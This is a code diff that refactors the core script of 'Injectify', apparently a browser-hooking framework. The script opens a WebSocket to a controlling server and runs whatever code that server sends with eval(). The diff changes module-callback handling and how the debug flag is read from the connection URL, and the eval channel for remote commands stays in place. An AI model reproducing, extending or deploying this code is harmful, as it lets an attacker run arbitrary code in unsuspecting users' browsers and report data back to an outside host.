@@ -1,4 +1,5 @@
 declare var ws: any
+declare var module: any
 /**
  * Injectify core API
  * @class
@@ -18,7 +19,6 @@ window['injectify'] = class Injectify {
 					callback(data.d, data.t)
 				}
 			} catch(e) {
-				//throw e
 				this.send('e', e.stack)
 			}
 		}
@@ -76,7 +76,8 @@ window['injectify'] = class Injectify {
 	 * @param {function} callback optional callback once the module has been loaded
 	 */
 	static module(name, params?: any, callback?: any) {
-		window["callbackFor" + name] = callback
+		if (typeof params === 'function') callback = params
+		if (typeof callback === 'function') window["callbackFor" + name] = callback
 		this.send('module', {
 			name: name,
 			params: params
@@ -92,15 +93,11 @@ window['injectify'] = class Injectify {
 	 * Returns information about Injectify
 	 */
 	static get info() {
-		var project = ws.url.split('?')[1],
-			debug   = false
-		if (project.charAt(0) == "$") {
-			project = project.substring(1)
-			debug   = true
-		}
+		var project = ws.url.split('?')[1]
+		if (this.debug) project = project.substring(1)
 		return {
 			project  : atob(project),
-			debug    : debug,
+			debug    : this.debug,
 			websocket: ws.url,
 		}
 	}
@@ -110,7 +107,7 @@ window['injectify'] = class Injectify {
 	 * false - console output should be suppressed
 	 */
 	static get debug() {
-		return this.info.debug
+		return ws.url.split('?')[1].charAt(0) == "$"
 	}
 }
 
@@ -132,13 +129,13 @@ window['injectify'].listen('*', (data, topic) => {
 			return
 		}
 		if (/^module:/.test(topic)) {
-			var module = topic.substring(7),
-				callback = window["callbackFor" + module]
+			var Module = topic.substring(7),
+				callback = window["callbackFor" + Module]
 			eval(data)
 			if (data !== false && typeof callback == 'function') {
-				callback()
+				callback(module.return)
 			}
-			delete window["callbackFor" + module]
+			delete window["callbackFor" + Module]
 			return
 		}
 		eval(data)
